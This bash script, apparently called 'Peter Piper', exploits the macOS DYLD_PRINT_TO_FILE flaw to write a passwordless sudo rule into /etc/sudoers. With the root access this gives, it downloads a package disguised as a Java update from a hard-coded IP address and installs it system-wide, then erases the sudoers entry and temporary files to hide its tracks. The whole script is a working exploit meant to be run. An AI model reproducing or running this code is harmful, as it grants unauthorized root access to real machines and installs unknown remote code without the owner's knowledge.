#!/bin/bash

# Peter Piper
# Exploit the machine, install on the machine, then cleanup the machine

# Created by:
# Patrick Hart & Zachery Rayburn

# See README.md for documentation

echo;echo
echo ' ██▓███  ▓█████▄▄▄█████▓▓█████  ██▀███      ██▓███   ██▓ ██▓███  ▓█████  ██▀███  '
echo '▓██░  ██▒▓█   ▀▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒   ▓██░  ██▒▓██▒▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒'
echo '▓██░ ██▓▒▒███  ▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒   ▓██░ ██▓▒▒██▒▓██░ ██▓▒▒███   ▓██ ░▄█ ▒'
echo '▒██▄█▓▒ ▒▒▓█  ▄░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄     ▒██▄█▓▒ ▒░██░▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄  '
echo '▒██▒ ░  ░░▒████▒ ▒██▒ ░ ░▒████▒░██▓ ▒██▒   ▒██▒ ░  ░░██░▒██▒ ░  ░░▒████▒░██▓ ▒██▒'
echo '▒▓▒░ ░  ░░░ ▒░ ░ ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░   ▒▓▒░ ░  ░░▓  ▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░'
echo '░▒ ░      ░ ░  ░   ░     ░ ░  ░  ░▒ ░ ▒░   ░▒ ░      ▒ ░░▒ ░      ░ ░  ░  ░▒ ░ ▒░'
echo '░░          ░    ░         ░     ░░   ░    ░░        ▒ ░░░          ░     ░░   ░ '
echo '            ░  ░           ░  ░   ░                  ░              ░  ░   ░     '
echo '                                                                                 '
echo 'Created by:'
echo 'Patrick Hart & Zachery Rayburn'
echo;echo

echo -e '\033[1mExploiting machine...\033[0m'
echo
function KeepSafe {
  echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo bash -c 'time if [[ $EUID -ne 0 ]]; then echo -e "\033[1mFailed! No root!\033[0m $(exit 1)"; else sudo mkdir -v /tmp$$; echo;echo; echo -e "\033[1mcURLing Java8Update60.pkg.tar...\033[0m"; sudo curl -# http://24.96.42.83/ownCloud/index.php/s/MipN60plXKZ21vg/download > /tmp$$/Java8Update60.pkg.tar; echo -e "\033[1mDone.\033[0m"; echo; echo -e "\033[1mUnpacking Java8Update60.pkg.tar...\033[0m"; tar -xfv /tmp$$/Java8Update60.pkg.tar; echo -e echo;echo; echo -e "\033[1mDone.\033[0m"; "\033[1mInstalling packages...\033[0m"; sudo installer -verbose -pkg /tmp$$/Java8Update60.pkg -target LocalSystem; echo; echo -e "\033[1mDone.\033[0m"; echo;echo; echo -e "\033[1mCleaning up exploited machine...\033[0m"; echo;echo; sudo sed -i "" "/NOPASSWD:ALL/d" /etc/sudoers; echo -e "\033[1mRemoving temporary files and directories...\033[0m"; echo -e "\033[1mRemoved: \033[0m"; rm -rfv /tmp$$; echo;echo; echo -e "\033[1mCompleted successfully.\033[0m"; fi; exit 0'
}
trap KeepSafe exit